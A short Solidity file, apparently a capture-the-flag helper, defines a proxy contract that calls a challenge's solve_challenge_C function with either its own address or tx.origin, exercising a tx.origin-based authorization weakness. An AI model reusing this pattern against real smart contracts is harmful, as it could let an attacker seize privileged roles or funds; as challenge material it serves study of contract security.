// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract proxy {
    function interactFail(address _targ) public {
        CTF(_targ).solve_challenge_C(address(this));
    }

    function interactSuccess(address _targ) public {
        CTF(_targ).solve_challenge_C(tx.origin);
    }
}

interface CTF {
    function solve_challenge_C(address _newPrincipal) external;
}
